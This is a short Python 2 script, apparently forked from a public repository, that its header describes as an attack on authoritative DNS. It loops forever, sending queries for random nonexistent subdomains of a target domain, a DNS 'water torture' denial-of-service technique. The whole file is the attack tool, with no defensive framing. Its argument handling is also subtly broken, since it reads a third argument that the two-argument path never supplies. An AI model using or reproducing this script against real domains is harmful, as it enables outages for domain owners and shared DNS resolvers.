#!/usr/bin/python
#Author : Antonio Taboada
#Date: 12/10/2016
#Filename: subdominio.py
#Purpose : Ataque DNS autoritativo con peticion de subdominios aleatorios inexistentes
#From: https://github.com/hackingyseguridad/watertorture/blob/master/subdominio.py 
#-- Forked by Christopher Gray
# Date: 4/19/18 - Version 0.0.1

import dns.resolver
import random
import sys
import socket

if len(sys.argv) < 2 or len(sys.argv) > 3:
    print "Using: " , sys.argv[0] , " domain "
    exit(0)
elif len(sys.argv) == 2:
    dominio = sys.argv[1]
    try:
        host=socket.gethostbyname(dominio)
    except:
        print "Domain not valid"
        exit(0)


# 8.8.8.8 is Google's public DNS server
#my_resolver.nameservers = ['8.8.8.8']

dns.resolver.nameservers = [sys.argv[2]]

print "Domain:", dominio
print "IP for Domain:", host
	
while 1:
	subdominio = str(random.randrange(10000000))
	url = subdominio+"."+dominio
	print "SubDomain:", url
	#r = dns.resolver.query('example.org', 'a')
	answers = dns.resolver.query(url)
	for rdata in answers: 
		print "IP SubDomain:", rdata
